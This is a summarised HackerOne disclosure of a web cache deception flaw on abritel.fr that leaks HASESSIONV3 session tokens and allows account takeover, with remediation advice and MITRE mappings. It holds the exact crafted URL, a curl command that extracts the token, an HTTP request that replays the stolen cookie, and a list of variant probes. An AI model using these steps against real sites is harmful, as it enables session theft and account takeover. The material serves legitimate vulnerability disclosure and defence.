# Cache Deception Attack Allows Session Token Extraction and Account Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 1698316 | https://hackerone.com/reports/1698316
- **Submitted:** 2022-09-12
- **Reporter:** bombon
- **Program:** Abritel (HomeAway)
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** Cache Deception, Session Token Disclosure, Improper Cache Control, Account Takeover
- **CVEs:** None
- **Category:** auth-crypto

## Summary
The application caches pages with session tokens (HASESSIONV3) when requested with certain URL patterns, particularly with image extensions (.jpeg) and query parameters. An attacker can retrieve cached pages containing authenticated user sessions and CSRF tokens, enabling complete account takeover of any victim who visits a malicious URL.

## Attack scenario
1. Attacker crafts a malicious URL using search endpoint with image extension: /search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis
2. Victim visits the crafted URL (via phishing, social engineering, or referrer injection)
3. Victim's authenticated session response is cached by CDN/proxy due to image extension appearing cacheable
4. Attacker requests the same URL and receives cached response containing victim's HASESSIONV3 session token
5. Attacker uses stolen session token to access victim's account via /traveler/profile/edit endpoint
6. Attacker locates ha.crumb CSRF token in the page and performs account takeover actions (password change, email update, bookings)

## Root cause
The application fails to properly set Cache-Control headers for authenticated endpoints. The presence of image file extensions (.jpeg) in the URL path causes CDN/caching infrastructure to treat the response as static cacheable content, despite the response containing sensitive authenticated session data and CSRF tokens.

## Attacker mindset
Exploit the mismatch between URL path structure and actual content type. Leverage the fact that cache rules are often based on file extensions rather than actual response content. Target high-impact endpoints by combining cache deception with CSRF token extraction to achieve complete account takeover without user interaction beyond initial visit.

## Defensive takeaways
- Implement strict Cache-Control headers (no-store, no-cache) on all authenticated endpoints regardless of URL structure
- Validate actual response content type against URL path and refuse caching of authenticated responses
- Use URL rewriting rules to normalize paths and prevent abuse of extension-based caching logic
- Implement cache key normalization that includes authentication status and user context
- Add Set-Cookie headers with Secure and HttpOnly flags, plus SameSite=Strict to mitigate session extraction
- Use CSRF token rotation on each request and bind tokens to session IDs
- Implement monitoring for unusual cache hit patterns or token extraction attempts
- Review CDN/proxy cache rules to ensure they align with application security requirements

## Variant hunting
Test other file extensions (.png, .gif, .js, .css, .pdf, .txt) with authenticated endpoints
Try path traversal payloads combined with image extensions: /profile/edit/../../x.jpeg
Test with double extensions: /profile/edit.jpeg.html
Attempt cache poisoning by manipulating X-Original-URL headers
Check if cache rules bypass works on other authenticated endpoints: /account, /settings, /booking
Test with query parameter pollution to trigger different cache keys
Investigate if caching occurs on different subdomains or regional CDN nodes

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1021: Remote Services (lateral movement via account takeover)
- T1550.001: Use Alternate Authentication Material (session token reuse)
- T1556: Modify Authentication Process (account modification via stolen session)
- T1539: Steal Web Session Cookie

## Notes
This is a sophisticated cache deception vulnerability combining multiple weaknesses: improper cache rules, absence of authentication-aware caching logic, and disclosure of both session tokens and CSRF tokens. The severity is Critical due to direct account takeover capability with no user authentication required from attacker. The vulnerability is easy to exploit and affects all authenticated users. Timeline and bounty amount not disclosed in writeup.

## Full report
<details><summary>Expand</summary>

## Summary:

I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access  the `ha.crumb` token located in  `/traveler/profile/edit` 


```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```


## Steps To Reproduce:

Victim Steps:

1->Visit https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis

Attacker Steps:

1->Visit the same URL using any other browser or do 

```curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'```

{F1923081}


2-> use the token 

```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```

and look for the `ha.crumb` variable in the response




## Recommended Remediation Steps 
  1. Add cache rules for certain all cacheable extensions

## Impact

Account Takeover

</details>

---
*Analysed by Claude on 2026-05-11*
